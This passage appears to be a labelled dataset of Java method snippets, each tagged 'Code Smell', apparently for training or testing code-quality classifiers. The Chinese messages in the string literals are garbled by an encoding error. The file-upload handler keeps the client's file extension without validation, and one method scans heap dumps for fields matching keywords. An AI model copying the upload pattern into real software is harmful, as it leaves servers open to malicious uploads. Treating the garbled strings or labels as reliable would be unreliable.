        return ResultGenerator.genFailResult(""鏈澶氫笂浼5寮犲浘鐗"");
      }
      total+=1;
      MultipartFile file=multiRequest.getFile(iter.next());
      multipartFiles.add(file);
    }
  }
  if (CollectionUtils.isEmpty(multipartFiles)) {
    return ResultGenerator.genFailResult(""鍙傛暟寮傚父"");
  }
  if (multipartFiles != null && multipartFiles.size() > 5) {
    return ResultGenerator.genFailResult(""鏈澶氫笂浼5寮犲浘鐗"");
  }
  List<String> fileNames=new ArrayList(multipartFiles.size());
  for (int i=0; i < multipartFiles.size(); i++) {
    String fileName=multipartFiles.get(i).getOriginalFilename();
    String suffixName=fileName.substring(fileName.lastIndexOf("".""));
    SimpleDateFormat sdf=new SimpleDateFormat(""yyyyMMdd_HHmmss"");
    Random r=new Random();
    StringBuilder tempName=new StringBuilder();
    tempName.append(sdf.format(new Date())).append(r.nextInt(100)).append(suffixName);
    String newFileName=tempName.toString();
    File fileDirectory=new File(Constants.FILE_UPLOAD_DIC);
    File destFile=new File(Constants.FILE_UPLOAD_DIC + newFileName);
    try {
      if (!fileDirectory.exists()) {
        if (!fileDirectory.mkdir()) {
          throw new IOException(""鏂囦欢澶瑰垱寤哄け璐,璺緞涓猴細"" + fileDirectory);
        }
      }
      multipartFiles.get(i).transferTo(destFile);
      fileNames.add(NewBeeMallUtils.getHost(new URI(httpServletRequest.getRequestURL() + """")) + ""/upload/"" + newFileName);
    }
 catch (    IOException e) {
      e.printStackTrace();
      return ResultGenerator.genFailResult(""鏂囦欢涓婁紶澶辫触"");
    }
  }
  Result resultSuccess=ResultGenerator.genSuccessResult();
  resultSuccess.setData(fileNames);
  return resultSuccess;
}",1,Code Smell
"protected void initOptionFromClass(Class<?> clz){
  if (clz == null) {
    return;
  }
 else {
    initOptionFromClass(clz.getSuperclass());
  }
  Syntax syntax=clz.getAnnotation(Syntax.class);
  if (syntax != null) {
    this.onlineHelp=syntax.onlineHelp();
  }
  Field[] fs=clz.getDeclaredFields();
  for (  Field f : fs) {
    Opt opt=f.getAnnotation(Opt.class);
    if (opt != null) {
      f.setAccessible(true);
      Option option=new Option();
      option.field=f;
      option.description=opt.description();
      option.hasArg=opt.hasArg();
      option.required=opt.required();
      if ("""".equals(opt.longOpt()) && """".equals(opt.opt())) {
        option.longOpt=fromCamel(f.getName());
        if (f.getType().equals(boolean.class)) {
          option.hasArg=false;
          try {
            if (f.getBoolean(this)) {
              throw new RuntimeException(""the value of "" + f + "" must be false, as it is declared as no args"");
            }
          }
 catch (          IllegalAccessException e) {
            throw new RuntimeException(e);
          }
        }
        checkConflict(option,""--"" + option.longOpt);
        continue;
      }
      if (!opt.hasArg()) {
        if (!f.getType().equals(boolean.class)) {
          throw new RuntimeException(""the type of "" + f + "" must be boolean, as it is declared as no args"");
        }
        try {
          if (f.getBoolean(this)) {
            throw new RuntimeException(""the value of "" + f + "" must be false, as it is declared as no args"");
          }
        }
 catch (        IllegalAccessException e) {
          throw new RuntimeException(e);
        }
      }
      boolean haveLongOpt=false;
      if (!"""".equals(opt.longOpt())) {
        option.longOpt=opt.longOpt();
        checkConflict(option,""--"" + option.longOpt);
        haveLongOpt=true;
      }
      if (!"""".equals(opt.argName())) {
        option.argName=opt.argName();
      }
      if (!"""".equals(opt.opt())) {
        option.opt=opt.opt();
        checkConflict(option,""-"" + option.opt);
      }
 else {
        if (!haveLongOpt) {
          throw new RuntimeException(""opt or longOpt is not set in @Opt(...) "" + f);
        }
      }
    }
  }
}
",1,Code Smell
"public static Drawable createThumb(TLRPC.WallPaper wallPaper){
  Drawable thumb=null;
  if (wallPaper.thumbDrawable != null) {
    return wallPaper.thumbDrawable;
  }
  if (wallPaper.stripedThumb != null) {
    return new BitmapDrawable(wallPaper.stripedThumb);
  }
  if (wallPaper.pattern && wallPaper.settings == null) {
    return new ColorDrawable(Color.BLACK);
  }
  if (wallPaper.document != null) {
    for (int i=0; i < wallPaper.document.thumbs.size(); i++) {
      if (wallPaper.document.thumbs.get(i) instanceof TLRPC.TL_photoStrippedSize) {
        thumb=new BitmapDrawable(ImageLoader.getStrippedPhotoBitmap(wallPaper.document.thumbs.get(i).bytes,""b""));
      }
    }
  }
 else {
    if (wallPaper.settings == null || wallPaper.settings.intensity < 0) {
      thumb=bitmapDrawableOf(new ColorDrawable(Color.BLACK));
    }
 else {
      if (wallPaper.settings.second_background_color == 0) {
        thumb=bitmapDrawableOf(new ColorDrawable(ColorUtils.setAlphaComponent(wallPaper.settings.background_color,255)));
      }
 else       if (wallPaper.settings.third_background_color == 0) {
        int color1=ColorUtils.setAlphaComponent(wallPaper.settings.background_color,255);
        int color2=ColorUtils.setAlphaComponent(wallPaper.settings.second_background_color,255);
        thumb=bitmapDrawableOf(new GradientDrawable(BackgroundGradientDrawable.getGradientOrientation(wallPaper.settings.rotation),new int[]{color1,color2}));
      }
 else {
        int color1=ColorUtils.setAlphaComponent(wallPaper.settings.background_color,255);
        int color2=ColorUtils.setAlphaComponent(wallPaper.settings.second_background_color,255);
        int color3=ColorUtils.setAlphaComponent(wallPaper.settings.third_background_color,255);
        int color4=wallPaper.settings.fourth_background_color == 0 ? 0 : ColorUtils.setAlphaComponent(wallPaper.settings.fourth_background_color,255);
        MotionBackgroundDrawable motionBackgroundDrawable=new MotionBackgroundDrawable();
        motionBackgroundDrawable.setColors(color1,color2,color3,color4);
        thumb=new BitmapDrawable(motionBackgroundDrawable.getBitmap());
      }
    }
  }
  return wallPaper.thumbDrawable=thumb;
}",1,Code Smell
"/** 
 * parse topic Parameter with format topic_1[,topic_2[:filterCond_2.1[;filterCond_2.2]]] topicParam->set(filterCond) map
 * @param topicParam - composite string
 * @return - map of topic->set(filterCond)
 */
public static Map<String,TreeSet<String>> parseTopicParam(String topicParam){
  Map<String,TreeSet<String>> topicAndFiltersMap=new HashMap<>();
  if (TStringUtils.isBlank(topicParam)) {
    return topicAndFiltersMap;
  }
  String[] topicFilterStrs=topicParam.split(TokenConstants.ARRAY_SEP);
  for (  String topicFilterStr : topicFilterStrs) {
    if (TStringUtils.isBlank(topicFilterStr)) {
      continue;
    }
    String[] topicFilters=topicFilterStr.split(TokenConstants.ATTR_SEP);
    if (TStringUtils.isBlank(topicFilters[0])) {
      continue;
    }
    TreeSet<String> filterSet=new TreeSet<>();
    if (topicFilters.length > 1 && TStringUtils.isNotBlank(topicFilters[1])) {
      String[] filterItems=topicFilters[1].split(TokenConstants.LOG_SEG_SEP);
      for (      String filterItem : filterItems) {
        if (TStringUtils.isBlank(filterItem)) {
          continue;
        }
        filterSet.add(filterItem.trim());
      }
    }
    topicAndFiltersMap.put(topicFilters[0].trim(),filterSet);
  }
  return topicAndFiltersMap;
}",1,Code Smell
"protected boolean handleBeltProcessingAndCheckIfRemoved(TransportedItemStack currentItem,float nextOffset,boolean noMovement){
  int currentSegment=(int)currentItem.beltPosition;
  if (currentItem.locked) {
    BeltProcessingBehaviour processingBehaviour=getBeltProcessingAtSegment(currentSegment);
    TransportedItemStackHandlerBehaviour stackHandlerBehaviour=getTransportedItemStackHandlerAtSegment(currentSegment);
    if (stackHandlerBehaviour == null)     return false;
    if (processingBehaviour == null) {
      currentItem.locked=false;
      belt.sendData();
      return false;
    }
    ProcessingResult result=processingBehaviour.handleHeldItem(currentItem,stackHandlerBehaviour);
    if (result == ProcessingResult.REMOVE)     return true;
    if (result == ProcessingResult.HOLD)     return false;
    currentItem.locked=false;
    belt.sendData();
    return false;
  }
  if (noMovement)   return false;
  if (currentItem.beltPosition > .5f || beltMovementPositive) {
    int firstUpcomingSegment=(int)(currentItem.beltPosition + (beltMovementPositive ? .5f : -.5f));
    int step=beltMovementPositive ? 1 : -1;
    for (int segment=firstUpcomingSegment; beltMovementPositive ? segment + .5f <= nextOffset : segment + .5f >= nextOffset; segment+=step) {
      BeltProcessingBehaviour processingBehaviour=getBeltProcessingAtSegment(segment);
      TransportedItemStackHandlerBehaviour stackHandlerBehaviour=getTransportedItemStackHandlerAtSegment(segment);
      if (processingBehaviour == null)       continue;
      if (stackHandlerBehaviour == null)       continue;
      if (BeltProcessingBehaviour.isBlocked(belt.getLevel(),BeltHelper.getPositionForOffset(belt,segment)))       continue;
      ProcessingResult result=processingBehaviour.handleReceivedItem(currentItem,stackHandlerBehaviour);
      if (result == ProcessingResult.REMOVE)       return true;
      if (result == ProcessingResult.HOLD) {
        currentItem.beltPosition=segment + .5f + (beltMovementPositive ? 1 / 512f : -1 / 512f);
        currentItem.locked=true;
        belt.sendData();
        return false;
      }
    }
  }
  return false;
}",1,Code Smell
"/** 
 * DO NOT USE, it's fragile instance methods are counted, both public/private, static methods are EXCLUDED, count from 0
 * @param obj
 * @param ordinal                the ordinal of instance method meeting the signature
 * @param expected               how many instance methods are expected there
 * @param argsTypesAndReturnType
 * @return
 * @throws NoSuchMethodException
 * @throws InvocationTargetException
 * @throws IllegalAccessException
 * @throws IllegalArgumentException
 */
public static Object invoke_virtual_declared_ordinal(Object obj,int ordinal,int expected,boolean strict,Object... argsTypesAndReturnType) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, IllegalArgumentException {
  Class clazz=obj.getClass();
  int argc=argsTypesAndReturnType.length / 2;
  Class[] argt=new Class[argc];
  Object[] argv=new Object[argc];
  Class returnType=null;
  if (argc * 2 + 1 == argsTypesAndReturnType.length) {
    returnType=(Class)argsTypesAndReturnType[argsTypesAndReturnType.length - 1];
  }
  int i, ii;
  Method[] m;
  Method[] candidates=new Method[expected];
  int count=0;
  Class[] _argt;
  for (i=0; i < argc; i++) {
    argt[i]=(Class)argsTypesAndReturnType[argc + i];
    argv[i]=argsTypesAndReturnType[i];
  }
  m=clazz.getDeclaredMethods();
  loop:   for (i=0; i < m.length; i++) {
    _argt=m[i].getParameterTypes();
    if (_argt.length == argt.length) {
      for (ii=0; ii < argt.length; ii++) {
        if (!argt[ii].equals(_argt[ii])) {
          continue loop;
        }
      }
      if (returnType != null && !returnType.equals(m[i].getReturnType())) {
        continue;
      }
      if (Modifier.isStatic(m[i].getModifiers())) {
        continue;
      }
      if (count < expected) {
        candidates[count++]=m[i];
      }
 else {
        if (!strict) {
          break;
        }
        throw new NoSuchMethodException(""More methods than expected("" + expected + "") at ""+ paramsTypesToString(argt)+ "" in ""+ obj.getClass().getName());
      }
    }
  }
  if (strict && count != expected) {
    throw new NoSuchMethodException(""Less methods("" + count + "") than expected(""+ expected+ "") at ""+ paramsTypesToString(argt)+ "" in ""+ obj.getClass().getName());
  }
  Arrays.sort(candidates,(o1,o2) -> {
    if (o1 == null && o2 == null) {
      return 0;
    }
    if (o1 == null) {
      return 1;
    }
    if (o2 == null) {
      return -1;
    }
    return strcmp(o1.getName(),o2.getName());
  }
);
  candidates[ordinal].setAccessible(true);
  return candidates[ordinal].invoke(obj,argv);
}",1,Code Smell
"private void setFloatingProgressVisible(boolean visible,boolean animate){
  if (floatingButton2 == null || floating2ProgressView == null) {
    return;
  }
  if (animate) {
    if (visible == floatingProgressVisible) {
      return;
    }
    if (floatingProgressAnimator != null) {
      floatingProgressAnimator.cancel();
    }
    floatingProgressVisible=visible;
    floatingProgressAnimator=new AnimatorSet();
    floatingProgressAnimator.playTogether(ObjectAnimator.ofFloat(floatingButton2,View.ALPHA,visible ? 0f : 1f),ObjectAnimator.ofFloat(floatingButton2,View.SCALE_X,visible ? 0.1f : 1f),ObjectAnimator.ofFloat(floatingButton2,View.SCALE_Y,visible ? 0.1f : 1f),ObjectAnimator.ofFloat(floating2ProgressView,View.ALPHA,visible ? 1f : 0f),ObjectAnimator.ofFloat(floating2ProgressView,View.SCALE_X,visible ? 1f : 0.1f),ObjectAnimator.ofFloat(floating2ProgressView,View.SCALE_Y,visible ? 1f : 0.1f));
    floatingProgressAnimator.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationStart(      Animator animation){
        floating2ProgressView.setVisibility(View.VISIBLE);
        floatingButton2.setVisibility(View.VISIBLE);
      }
      @Override public void onAnimationEnd(      Animator animation){
        if (animation == floatingProgressAnimator) {
          if (visible) {
            if (floatingButton2 != null) {
              floatingButton2.setVisibility(View.GONE);
            }
          }
 else {
            if (floatingButton2 != null) {
              floating2ProgressView.setVisibility(View.GONE);
            }
          }
          floatingProgressAnimator=null;
        }
      }
    }
);
    floatingProgressAnimator.setDuration(150);
    floatingProgressAnimator.setInterpolator(CubicBezierInterpolator.DEFAULT);
    floatingProgressAnimator.start();
  }
 else {
    if (floatingProgressAnimator != null) {
      floatingProgressAnimator.cancel();
    }
    floatingProgressVisible=visible;
    if (visible) {
      floatingButton2.setAlpha(0f);
      floatingButton2.setScaleX(0.1f);
      floatingButton2.setScaleY(0.1f);
      floatingButton2.setVisibility(View.GONE);
      floating2ProgressView.setAlpha(1f);
      floating2ProgressView.setScaleX(1f);
      floating2ProgressView.setScaleY(1f);
      floating2ProgressView.setVisibility(View.VISIBLE);
    }
 else {
      floatingButton2.setAlpha(1f);
      floatingButton2.setScaleX(1f);
      floatingButton2.setScaleY(1f);
      floatingButton2.setVisibility(View.VISIBLE);
      floating2ProgressView.setAlpha(0f);
      floating2ProgressView.setScaleX(0.1f);
      floating2ProgressView.setScaleY(0.1f);
      floating2ProgressView.setVisibility(View.GONE);
    }
  }
}",1,Code Smell
"private void showDialog(@NonNull VersionInfo versionInfo){
  showDialog(versionInfo,mContext);
}
private void showDialog(@NonNull VersionInfo versionInfo,Context context){
  String propVersion=versionInfo.getVersionName();
  if (propVersion.isEmpty()) {
    new Dialog.Builder.Prompt(context,R.string.error_check_for_update,R.string.error_parse_version_info).build().show();
    return;
  }
  mUpdateDialog=new Dialog.Builder.Update(context,propVersion).build();
  mPendingDialog=new Dialog.Builder.Pending(context,R.string.text_preparing).build();
  MDButton neutralButton=mUpdateDialog.getActionButton(DialogAction.NEUTRAL);
  neutralButton.setOnClickListener(v -> new MaterialDialog.Builder(context).title(R.string.text_prompt).content(R.string.prompt_add_ignored_version).negativeText(R.string.dialog_button_cancel).positiveText(R.string.dialog_button_confirm).positiveColorRes(R.color.dialog_button_warn).onPositive((dPrompt,which) -> {
    UpdateUtils.addIgnoredVersion(versionInfo);
    ViewUtils.showToast(context,R.string.text_done);
    mUpdateDialog.dismiss();
  }
).show());
  MDButton negativeButton=mUpdateDialog.getActionButton(DialogAction.NEGATIVE);
  negativeButton.setOnClickListener(v -> mUpdateDialog.dismiss());
  MDButton positiveButton=mUpdateDialog.getActionButton(DialogAction.POSITIVE);
  positiveButton.setOnClickListener(null);
  mUpdateDialog.show();
  mGitHubExecutor.execute(() -> {
    GitHub github=GHub.getConnection();
    if (github == null) {
      Dialog.setDialogContent(mUpdateDialog,R.string.error_cannot_connect_to_github);
      return;
    }
    String userName=context.getString(R.string.developer_full_name);
    String repoName=context.getString(R.string.app_name);
    GHRepository repo=GHub.getRepo(github,userName,repoName);
    if (repo == null) {
      Dialog.setDialogContent(mUpdateDialog,mUpdateDialog.getContext().getString(R.string.error_invalid_github_repo,repoName));
      return;
    }
    GHRelease release=GHub.getRelease(repo);
    if (release == null) {
      Dialog.setDialogContent(mUpdateDialog,R.string.error_get_github_latest_release);
      return;
    }
    String releaseTag=release.getTagName();
    if (!GHub.isTagMatches(releaseTag,propVersion)) {
      Dialog.setDialogContent(mUpdateDialog,R.string.error_corresponding_github_release_may_not_published);
      return;
    }
    String rawHtmlContent=GHub.getReleaseHtml(repo,release);
    Spanned htmlContent=Html.fromHtml(rawHtmlContent,Html.FROM_HTML_MODE_COMPACT);
    if (htmlContent.toString().isEmpty()) {
      Dialog.setDialogContent(mUpdateDialog,R.string.text_empty_release_note);
    }
 else {
      Dialog.setDialogContent(mUpdateDialog,htmlContent);
    }
    PagedIterable<GHAsset> assets=GHub.getAssets(release);
    if (assets == null) {
      mHandler.post(() -> new Dialog.Builder.Prompt(context,R.string.error_empty_github_release_assets).build().show());
      return;
    }
    mHandler.post(() -> setDialogUpdateButton(context,assets,versionInfo));
  }
);
}
",1,Code Smell
"@Override public void draw(@NonNull Canvas canvas,CharSequence text,int start,int end,float x,int top,int y,int bottom,@NonNull Paint paint){
  int color;
  if (checkColorDelegate != null) {
    checkColorDelegate.run();
  }
 else {
    if (overrideColor != 0) {
      color=overrideColor;
    }
 else     if (useLinkPaintColor && paint instanceof TextPaint) {
      color=((TextPaint)paint).linkColor;
    }
 else     if (usePaintColor) {
      color=paint.getColor();
    }
 else {
      color=Theme.getColor(colorKey);
    }
    if (drawableColor != color) {
      drawableColor=color;
      drawable.setColorFilter(new PorterDuffColorFilter(drawableColor,PorterDuff.Mode.MULTIPLY));
    }
  }
  canvas.save();
  int transY=bottom - (drawable != null ? drawable.getBounds().bottom : bottom);
  if (verticalAlignment == ALIGN_BASELINE) {
  }
 else   if (verticalAlignment == ALIGN_CENTER) {
    transY=top + (bottom - top) / 2 - (drawable != null ? drawable.getBounds().height() / 2 : 0);
  }
 else   if (verticalAlignment == ALIGN_DEFAULT) {
    int lineHeight=bottom - top;
    int drawableHeight=size != 0 ? size : drawable.getIntrinsicHeight();
    int padding=(lineHeight - drawableHeight) / 2;
    transY=top + padding + AndroidUtilities.dp(topOffset);
  }
  canvas.translate(x + translateX,transY + translateY);
  if (drawable != null) {
    if (scaleX != 1f || scaleY != 1f) {
      canvas.scale(scaleX,scaleY,0,drawable.getBounds().centerY());
    }
    if (rotate != 1f) {
      canvas.rotate(rotate,drawable.getBounds().centerX(),drawable.getBounds().centerY());
    }
    if (alpha != 1f || paint.getAlpha() != 0xFF) {
      drawable.setAlpha((int)(alpha * paint.getAlpha()));
    }
    drawable.draw(canvas);
  }
  canvas.restore();
}",1,Code Smell
"@Override protected void initContext(Event event){
  if (event.type == Event.Type.BEFORE) {
    BeforeEvent be=(BeforeEvent)event;
    Object request=be.argumentArray[0];
    if (request instanceof HttpServletRequest) {
      HttpServletRequest req=((HttpServletRequest)request);
      if (req.getRequestURI().contains(""sandbox"")) {
        log.debug(""request:{} is ignored"",req.getRequestURI());
        return;
      }
      String traceIdX=req.getHeader(Constants.HEADER_TRACE_ID_X);
      if (StringUtils.isEmpty(traceIdX)) {
        traceIdX=req.getParameter(Constants.HEADER_TRACE_ID_X);
      }
      if (TraceGenerator.isValid(traceIdX)) {
        if (log.isInfoEnabled()) {
          log.info(""Http before event, 浠巋eader鎴杙arameter涓幏鍙栫殑 traceIdX 涓猴細"" + traceIdX);
        }
        RepeatMeta meta=new RepeatMeta();
        meta.setAppName(MOONBOX_CONTEXT.getAppName());
        meta.setMock(MOONBOX_CONTEXT.getConfig().isRepeaterMock());
        meta.setTraceId(traceIdX);
        meta.setMatchPercentage(100);
        meta.setStrategyType(MockStrategy.StrategyType.PARAMETER_MATCH);
        meta.setRepeatId(traceIdX);
        RepeaterResult<RecordModel> pr=StandaloneSwitch.getInstance().getBroadcaster().pullRecord(meta);
        if (pr.isSuccess()) {
          Tracer.start();
          RepeatContext context=new RepeatContext(meta,pr.getData(),Tracer.getTraceId());
          MoonboxRepeatCache.putRepeatContext(context);
          return;
        }
      }
      String traceId=req.getHeader(Constants.HEADER_TRACE_ID);
      if (StringUtils.isEmpty(traceId)) {
        traceId=req.getParameter(Constants.HEADER_TRACE_ID);
      }
      if (TraceGenerator.isValid(traceId)) {
        if (log.isInfoEnabled()) {
          log.info(""Http before event, 浠巋eader鎴杙arameter涓幏鍙栫殑traceId涓猴細"" + traceId);
        }
        Tracer.start(traceId);
        return;
      }
    }
  }
  super.initContext(event);
}",1,Code Smell
"public void visit_RETURN(PcodeOp pcode,AbsEnv inOutEnv,AbsEnv tmpEnv){
  Function function=context.getFunction();
  if (function.hasNoReturn()) {
    return;
  }
  for (  Entry<ALoc,KSet> entry : inOutEnv.getEnvMap()) {
    ALoc aLoc=entry.getKey();
    if (aLoc.isSP()) {
      if (GlobalState.arch.isX86()) {
        KSet spKSet=inOutEnv.get(aLoc);
        KSet adjustedKSet=adjustLocalAbsVal(spKSet);
        if (adjustedKSet != null) {
          inOutEnv.set(aLoc,adjustedKSet,true);
        }
      }
 else {
        inOutEnv.set(aLoc,KSet.getBot(aLoc.getLen() * 8),true);
      }
    }
 else     if (aLoc.getRegion().isLocal()) {
      Function localFunction=((Local)aLoc.getRegion()).getFunction();
      Function currentFunction=context.getFunction();
      if (localFunction == currentFunction) {
        inOutEnv.set(aLoc,KSet.getBot(aLoc.getLen() * 8),true);
      }
    }
  }
  AbsEnv oldExitEnv=new AbsEnv(context.getExitValue());
  AbsEnv resEnv=oldExitEnv.join(inOutEnv);
  if (resEnv == null) {
    return;
  }
  context.setExitValue(resEnv.getEnvMap());
  long[] callString=context.getCallString();
  Function[] callStringFunctions=context.getFuncs();
  Address lastCallSite=GlobalState.flatAPI.toAddr(callString[GlobalState.config.getCallStringK() - 1]);
  Function lastFunction=callStringFunctions[GlobalState.config.getCallStringK() - 1];
  if (lastFunction == null) {
    return;
  }
  long[] prevCallString=context.popLast();
  Set<long[]> callStringSet=ContextTransitionTable.getInstance().get(lastCallSite,prevCallString);
  if (callStringSet == null) {
    return;
  }
  for (  long[] cs : callStringSet) {
    Context callerCtx=Context.getContext(lastFunction,cs);
    if (callerCtx != null) {
      callerCtx.insertToWorklist(lastCallSite);
      if (!Context.isWait(callerCtx)) {
        Context.pushActive(callerCtx);
      }
    }
  }
}",1,Code Smell
"@Override public void tick(){
  super.tick();
  if (!level.isClientSide)   canPickUpItems=canDirectlyInsert();
  boolean clientSide=level != null && level.isClientSide && !isVirtual();
  float itemMotion=getItemMotion();
  if (itemMotion != 0 && level != null && level.isClientSide)   spawnParticles(itemMotion);
  tickAirStreams(itemMotion);
  if (item.isEmpty() && !clientSide) {
    if (itemMotion < 0)     handleInputFromAbove();
    if (itemMotion > 0)     handleInputFromBelow();
    return;
  }
  float nextOffset=itemPosition.getValue() + itemMotion;
  if (itemMotion < 0) {
    if (nextOffset < .5f) {
      if (!handleDownwardOutput(true))       nextOffset=.5f;
 else       if (nextOffset < 0) {
        handleDownwardOutput(clientSide);
        nextOffset=itemPosition.getValue();
      }
    }
  }
 else   if (itemMotion > 0) {
    if (nextOffset > .5f) {
      if (!handleUpwardOutput(true))       nextOffset=.5f;
 else       if (nextOffset > 1) {
        handleUpwardOutput(clientSide);
        nextOffset=itemPosition.getValue();
      }
    }
  }
  itemPosition.setValue(nextOffset);
}",1,Code Smell
"private JavaType genericType(GenericsType g,String signature){
  if (!g.isPlaceholder() && !g.isWildcard()) {
    return type(g.getType());
  }
  JavaType.GenericTypeVariable.Variance variance=INVARIANT;
  JavaType.GenericTypeVariable gtv=new JavaType.GenericTypeVariable(null,g.getName(),variance,null);
  typeCache.put(signature,gtv);
  List<JavaType> bounds=null;
  if (g.getUpperBounds() != null) {
    for (    ClassNode bound : g.getUpperBounds()) {
      JavaType.FullyQualified mappedBound=TypeUtils.asFullyQualified(type(bound));
      if (mappedBound != null && !""java.lang.Object"".equals(mappedBound.getFullyQualifiedName())) {
        if (bounds == null) {
          bounds=new ArrayList<>(g.getUpperBounds().length);
        }
        bounds.add(mappedBound);
        variance=COVARIANT;
      }
    }
  }
 else   if (g.getLowerBound() != null) {
    JavaType.FullyQualified mappedBound=TypeUtils.asFullyQualified(type(g.getLowerBound()));
    if (mappedBound != null && !""java.lang.Object"".equals(mappedBound.getFullyQualifiedName())) {
      bounds=singletonList(mappedBound);
      variance=CONTRAVARIANT;
    }
  }
  gtv.unsafeSet(gtv.getName(),variance,bounds);
  return gtv;
}
",1,Code Smell
"private void processV0Msg(Channel channel,ByteBuf cb,AbsV0MsgCodec msgCodec) throws Exception {
  final StringBuilder strBuff=new StringBuilder(512);
  if (!msgCodec.descMsg(source,cb)) {
    responseV0Msg(channel,msgCodec,strBuff);
    return;
  }
  if (source.isRejectService()) {
    source.fileMetricIncSumStats(StatConstants.EVENT_SERVICE_CLOSED);
    msgCodec.setFailureInfo(DataProxyErrCode.SERVICE_CLOSED);
    responseV0Msg(channel,msgCodec,strBuff);
    return;
  }
  if (!ConfigManager.getInstance().isMqClusterReady()) {
    source.fileMetricIncSumStats(StatConstants.EVENT_SERVICE_SINK_UNREADY);
    msgCodec.setFailureInfo(DataProxyErrCode.SINK_SERVICE_UNREADY);
    responseV0Msg(channel,msgCodec,strBuff);
    return;
  }
  if (!msgCodec.validAndFillFields(source,strBuff)) {
    responseV0Msg(channel,msgCodec,strBuff);
    return;
  }
  Event event=msgCodec.encEventPackage(source,channel);
  try {
    source.getCachedChProcessor().processEvent(event);
    source.fileMetricAddSuccStats(strBuff,msgCodec.getGroupId(),msgCodec.getStreamId(),msgCodec.getTopicName(),msgCodec.getStrRemoteIP(),msgCodec.getMsgProcType(),msgCodec.getDataTimeMs(),msgCodec.getMsgPkgTime(),msgCodec.getMsgCount(),1,event.getBody().length);
    source.addMetric(true,event.getBody().length,event);
    if (msgCodec.isNeedResp() && !msgCodec.isOrderOrProxy()) {
      msgCodec.setSuccessInfo();
      responseV0Msg(channel,msgCodec,strBuff);
    }
  }
 catch (  Throwable ex) {
    source.fileMetricAddFailStats(strBuff,msgCodec.getGroupId(),msgCodec.getStreamId(),msgCodec.getTopicName(),msgCodec.getStrRemoteIP(),msgCodec.getMsgProcType(),msgCodec.getDataTimeMs(),msgCodec.getMsgPkgTime(),1);
    source.addMetric(false,event.getBody().length,event);
    if (msgCodec.isNeedResp()) {
      msgCodec.setFailureInfo(DataProxyErrCode.PUT_EVENT_TO_CHANNEL_FAILURE,strBuff.append(""Put msg event to channel failure: "").append(ex.getMessage()).toString());
      strBuff.delete(0,strBuff.length());
      responseV0Msg(channel,msgCodec,strBuff);
    }
    if (logCounter.shouldPrint()) {
      logger.error(""Error writing msg event to channel failure, attrs={}"",msgCodec.getAttr(),ex);
    }
  }
}",1,Code Smell
"/** 
 * @hidden Truncate operator that understands the endianess of the data. rhs KSet indicates the number of least significant bytes of this KSets to be thrown away. output is filled with any remaining bytes up to the size of output. If the size of resBits is smaller than the size of this minus rhs, then additional most significant bytes of result will also be truncated.
 * @param rhs
 * @param resBits
 * @return KSet
 */
public KSet subPiece(KSet rhs,int resBits){
  assert !rhs.isTop();
  long taintRes=getBinaryTaintResult(rhs);
  if (isTop()) {
    return getTop(taintRes);
  }
  KSet res=new KSet(resBits,taintRes);
  if (isBot()) {
    return res;
  }
  for (  AbsVal op : kSet) {
    if (op.region.isGlobal()) {
      for (      AbsVal byteCount : rhs.kSet) {
        if (op.region.isGlobal() && !byteCount.isBigVal()) {
          if (bits <= 64) {
            long tmp=(op.value >>> (byteCount.value * 8)) & getMask(resBits);
            res.kSet=res.kSet.insert(new AbsVal(Global.getInstance(),tmp));
          }
 else {
            BigInteger bigTmp=op.toBigInteger(bits,false);
            bigTmp=bigTmp.shiftRight((int)byteCount.value * 8).and(getBigMask(resBits));
            res.kSet=res.kSet.insert(new AbsVal(Global.getInstance(),bigTmp));
          }
        }
      }
    }
  }
  return res;
}",1,Code Smell
"private void handleArgs(Bundle args){
  if (args == null) {
    return;
  }
  String action=args.getString(KEY_ACTION);
  mAction=action;
  if (ACTION_GALLERY_INFO.equals(action)) {
    mGalleryInfo=args.getParcelable(KEY_GALLERY_INFO);
    if (null != mGalleryInfo) {
      EhDB.putHistoryInfo(mGalleryInfo);
    }
  }
 else   if (ACTION_GID_TOKEN.equals(action)) {
    mGid=args.getLong(KEY_GID);
    mToken=args.getString(KEY_TOKEN);
  }
 else   if (ACTION_DOWNLOAD_GALLERY_INFO.equals(action)) {
    try {
      mDownloadInfo=args.getParcelable(KEY_GALLERY_INFO);
      mGalleryInfo=mDownloadInfo;
      if (null != mGalleryInfo) {
        EhDB.putHistoryInfo(mGalleryInfo);
      }
    }
 catch (    ClassCastException e) {
      mGalleryInfo=args.getParcelable(KEY_GALLERY_INFO);
      if (null != mGalleryInfo) {
        EhDB.putHistoryInfo(mGalleryInfo);
      }
    }
  }
  comeFromDownload=args.getBoolean(KEY_COME_FROM_DOWNLOAD);
}
",1,Code Smell
"public String sniff(IHeapHolder heapHolder){
  final StringBuilder result=new StringBuilder();
  try {
    for (Iterator it=heapHolder.getClasses(); it.hasNext(); ) {
      Object clazz=it.next();
      List<String> fieldList=new LinkedList<String>();
      fieldList.addAll(getFields(heapHolder,clazz,keywordList));
      if (fieldList.isEmpty())       continue;
      fieldList.addAll(getFields(heapHolder,clazz,unimportantKeywordList));
      List instances=heapHolder.getInstances(clazz);
      if (instances.isEmpty())       continue;
      HashMap<String,String> fieldMap=new HashMap<String,String>();
      for (      String fieldName : fieldList) {
        fieldMap.put(fieldName,fieldName);
      }
      StringBuilder subResult=new StringBuilder();
      boolean isAllEmpty=true;
      subResult.append(heapHolder.getClassName(clazz)).append("":\r\n"");
      List<String> instanceInfo=new LinkedList<String>();
      for (      Object instance : instances) {
        String dumpString=HashMapUtils.dumpString(heapHolder.getFieldsByNameList(instance,fieldMap),true,false,true);
        if (!dumpString.equals("""")) {
          isAllEmpty=false;
          instanceInfo.add(""["" + dumpString + ""]"");
        }
      }
      if (!isAllEmpty) {
        Object[] instanceArray=(new HashSet(instanceInfo)).toArray();
        result.append(subResult);
        for (        Object str : instanceArray) {
          result.append(str).append(""\r\n"");
        }
        result.append(""\r\n"");
      }
    }
  }
 catch (  Exception ex) {
    System.out.println(ex);
  }
  return result.toString();
}
",1,Code Smell
"@Override public J visitMethod(MethodTree node,Space fmt){
  JCMethodDecl jcMethod=(JCMethodDecl)node;
  Map<Integer,JCAnnotation> annotationPosTable=mapAnnotations(node.getModifiers().getAnnotations(),new HashMap<>(node.getModifiers().getAnnotations().size()));
  ReloadableJava11ModifierResults modifierResults=sortedModifiersAndAnnotations(node.getModifiers(),annotationPosTable);
  J.TypeParameters typeParams;
  if (node.getTypeParameters().isEmpty()) {
    typeParams=null;
  }
 else {
